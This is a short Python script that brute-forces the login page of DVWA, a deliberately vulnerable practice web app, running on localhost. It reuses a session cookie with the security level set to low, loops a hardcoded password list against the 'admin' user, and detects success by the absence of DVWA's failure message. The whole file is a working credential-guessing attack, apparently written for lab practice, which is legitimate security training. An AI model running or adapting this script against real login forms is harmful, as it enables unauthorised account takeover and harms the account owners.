import requests

URL = "http://127.0.0.1/DVWA/vulnerabilities/brute/"
# Creating the session cookie (opened in browser)
cookie = {"PHPSESSID":"9tp4hi0m7muokdfi94sk31ji4f", "security":"low"}
# Password list to bruteforce
passwords = ['1234','abcde','abcd1234','password', 'pass1234', 'notapass']

for pwd in passwords:
	print("Trying {0}".format(pwd))
	# Try password and get the response
	response = requests.get("{0}?username=admin&password={1}&Login=Login".format(URL, pwd), cookies=cookie)
	# If the response has this string in it (DVWA gives this string when password is incorrect)
	if response.text.find("Username and/or password incorrect.") > 0:
		print("\t Password failed \n")
	# If it does not have the string
	else:
		print("\t Password worked \n")
